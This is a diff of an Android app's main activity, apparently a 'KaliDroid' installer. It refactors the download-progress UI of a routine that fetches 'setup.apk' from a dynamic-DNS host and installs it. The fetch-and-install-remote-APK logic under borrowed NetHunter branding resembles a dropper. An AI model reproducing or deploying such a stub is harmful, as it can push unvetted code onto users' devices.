@@ -1,6 +1,5 @@
 package com.nethunter.kalidroid
 
-import android.app.AlertDialog
 import android.content.Intent
 import android.os.Bundle
 import android.os.Handler
@@ -24,70 +23,126 @@ class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val TAG = "KaliDroid"
-        private const val APK_URL = "http://kimo.gotdns.ch/setup.apk"
+        private const val APK_URL = "https://kimo.gotdns.ch/setup.apk"
         private const val FILE_PROVIDER_AUTHORITY = "com.nethunter.kalidroid.provider"
     }
 
     private val handler = Handler(Looper.getMainLooper())
     private var downloadThread: Thread? = null
 
+    // Header
+    private lateinit var ivPhaseIcon: ImageView
+    private lateinit var tvPhase: TextView
+    private lateinit var mainStatusDot: View
+    private lateinit var tvLive: TextView
+
+    // Panels
+    private lateinit var idlePanel: View
+    private lateinit var progressPanel: View
+
+    // Progress views
+    private lateinit var tvStatus: TextView
+    private lateinit var tvStatusHint: TextView
+    private lateinit var progressBar: ProgressBar
+    private lateinit var circular: CircularProgressIndicator
+    private lateinit var tvPercent: TextView
+    private lateinit var tvSpeed: TextView
+    private lateinit var tvSize: TextView
+    private lateinit var tvRemaining: TextView
+    private lateinit var btnCancel: MaterialButton
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        // Idle decorative animations
         findViewById<ImageView>(R.id.ivMainRingScanner)
             .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_cw))
         findViewById<ImageView>(R.id.ivMainRingDashed)
             .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_ccw))
-        findViewById<View>(R.id.mainStatusDot)
-            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))
+        mainStatusDot = findViewById(R.id.mainStatusDot)
+        mainStatusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))
 
-        findViewById<MaterialButton>(R.id.btnDownload).setOnClickListener {
-            showDownloadDialog()
-        }
-    }
+        // Header
+        ivPhaseIcon = findViewById(R.id.ivPhaseIcon)
+        tvPhase     = findViewById(R.id.tvPhase)
+        tvLive      = findViewById(R.id.tvLive)
 
-    private fun showDownloadDialog() {
-        val dialogView = layoutInflater.inflate(R.layout.dialog_progress, null)
+        // Panels
+        idlePanel     = findViewById(R.id.idlePanel)
+        progressPanel = findViewById(R.id.progressPanel)
 
-        val tvPhase       = dialogView.findViewById<TextView>(R.id.tvPhase)
-        val ivPhaseIcon   = dialogView.findViewById<ImageView>(R.id.ivPhaseIcon)
-        val tvLive        = dialogView.findViewById<TextView>(R.id.tvLive)
-        val statusDot     = dialogView.findViewById<View>(R.id.statusDot)
-        val tvStatus      = dialogView.findViewById<TextView>(R.id.tvStatus)
-        val tvStatusHint  = dialogView.findViewById<TextView>(R.id.tvStatusHint)
-        val progressBar   = dialogView.findViewById<ProgressBar>(R.id.progressBar)
-        val circular      = dialogView.findViewById<CircularProgressIndicator>(R.id.circularProgress)
-        val tvPercent     = dialogView.findViewById<TextView>(R.id.tvPercent)
-        val tvSpeed       = dialogView.findViewById<TextView>(R.id.tvSpeed)
-        val tvSize        = dialogView.findViewById<TextView>(R.id.tvSize)
-        val tvRemaining   = dialogView.findViewById<TextView>(R.id.tvRemaining)
-        val ringScanner   = dialogView.findViewById<ImageView>(R.id.ivRingScanner)
-        val ringDashed    = dialogView.findViewById<ImageView>(R.id.ivRingDashed)
-        val btnCancel     = dialogView.findViewById<MaterialButton>(R.id.btnCancel)
-
-        // Decorative animations
-        ringScanner.startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_cw))
-        ringDashed.startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_ccw))
-        statusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))
+        // Progress views
+        tvStatus     = findViewById(R.id.tvStatus)
+        tvStatusHint = findViewById(R.id.tvStatusHint)
+        progressBar  = findViewById(R.id.progressBar)
+        circular     = findViewById(R.id.circularProgress)
+        tvPercent    = findViewById(R.id.tvPercent)
+        tvSpeed      = findViewById(R.id.tvSpeed)
+        tvSize       = findViewById(R.id.tvSize)
+        tvRemaining  = findViewById(R.id.tvRemaining)
+        btnCancel    = findViewById(R.id.btnCancel)
 
         circular.max = 1000
-        circular.setProgressCompat(0, false)
 
-        val dialog = AlertDialog.Builder(this, R.style.DownloadDialogTheme)
-            .setView(dialogView)
-            .setCancelable(false)
-            .create()
+        findViewById<MaterialButton>(R.id.btnDownload).setOnClickListener {
+            startDownload()
+        }
 
         btnCancel.setOnClickListener {
             downloadThread?.interrupt()
-            dialog.dismiss()
+            showIdlePanel()
         }
+    }
 
-        dialog.show()
+    private fun showIdlePanel() {
+        progressPanel.visibility = View.GONE
+        idlePanel.visibility = View.VISIBLE
+        // Reset header back to its ready/online state
+        ivPhaseIcon.setImageResource(R.drawable.ic_package)
+        tvPhase.text = getString(R.string.main_chip_version)
+        tvPhase.setTextColor(getColor(R.color.kali_blue))
+        tvLive.text = getString(R.string.main_ready_label)
+        tvLive.setTextColor(getColor(R.color.valid_green))
+        mainStatusDot.setBackgroundResource(R.drawable.status_dot)
+        mainStatusDot.backgroundTintList = null
+        mainStatusDot.alpha = 1f
+        mainStatusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))
+        btnCancel.text = getString(android.R.string.cancel)
+    }
 
-        tvPhase.text     = getString(R.string.phase_downloading)
-        tvStatus.text    = getString(R.string.status_connecting)
+    private fun startDownload() {
+        // Swap to the progress panel
+        idlePanel.visibility = View.GONE
+        progressPanel.visibility = View.VISIBLE
+
+        // Decorative animations for the progress rings + dot
+        findViewById<ImageView>(R.id.ivRingScanner)
+            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_cw))
+        findViewById<ImageView>(R.id.ivRingDashed)
+            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_ccw))
+
+        // Reset state
+        circular.setProgressCompat(0, false)
+        progressBar.progress = 0
+        tvPercent.text   = getString(R.string.percent_format, 0)
+        tvSpeed.text     = getString(R.string.dash)
+        tvSize.text      = getString(R.string.dash)
+        tvRemaining.text = getString(R.string.dash)
+        btnCancel.text   = getString(android.R.string.cancel)
+
+        // Header → downloading state
+        ivPhaseIcon.setImageResource(R.drawable.ic_download)
+        tvPhase.text  = getString(R.string.phase_downloading)
+        tvPhase.setTextColor(getColor(R.color.kali_blue))
+        tvLive.text   = getString(R.string.live_label)
+        tvLive.setTextColor(getColor(R.color.valid_green))
+        mainStatusDot.setBackgroundResource(R.drawable.status_dot)
+        mainStatusDot.backgroundTintList = null
+        mainStatusDot.alpha = 1f
+        mainStatusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))
+
+        tvStatus.text     = getString(R.string.status_connecting)
         tvStatusHint.text = getString(R.string.status_hint_connect)
 
         downloadThread = Thread {
@@ -126,6 +181,7 @@ class MainActivity : AppCompatActivity() {
                 Log.d(TAG, "Downloaded: ${apkFile.absolutePath} (${apkFile.length()} B)")
 
                 handler.post {
+                    ivPhaseIcon.setImageResource(R.drawable.ic_package)
                     tvPhase.text      = getString(R.string.phase_verifying)
                     tvStatus.text     = getString(R.string.status_verifying)
                     tvStatusHint.text = getString(R.string.status_hint_verify)
@@ -152,21 +208,26 @@ class MainActivity : AppCompatActivity() {
                 }
 
                 Thread.sleep(700)
-                handler.post { dialog.dismiss(); installApk(apkFile) }
+                handler.post {
+                    showIdlePanel()
+                    installApk(apkFile)
+                }
 
             } catch (_: InterruptedException) {
                 // user cancelled
             } catch (e: Exception) {
                 handler.post {
-                    statusDot.clearAnimation()
-                    statusDot.alpha = 1f
-                    statusDot.setBackgroundResource(R.drawable.status_dot)
-                    statusDot.backgroundTintList = android.content.res.ColorStateList.valueOf(
+                    mainStatusDot.clearAnimation()
+                    mainStatusDot.alpha = 1f
+                    mainStatusDot.setBackgroundResource(R.drawable.status_dot)
+                    mainStatusDot.backgroundTintList = android.content.res.ColorStateList.valueOf(
                         getColor(R.color.invalid_red)
                     )
                     tvLive.text = getString(R.string.offline_label)
                     tvLive.setTextColor(getColor(R.color.invalid_red))
+                    ivPhaseIcon.setImageResource(R.drawable.ic_package)
                     tvPhase.text       = getString(R.string.phase_error)
+                    tvPhase.setTextColor(getColor(R.color.invalid_red))
                     tvStatus.text      = e.message ?: getString(R.string.error_unknown)
                     tvStatusHint.text  = getString(R.string.status_hint_error)
                     tvSpeed.text       = getString(R.string.dash)
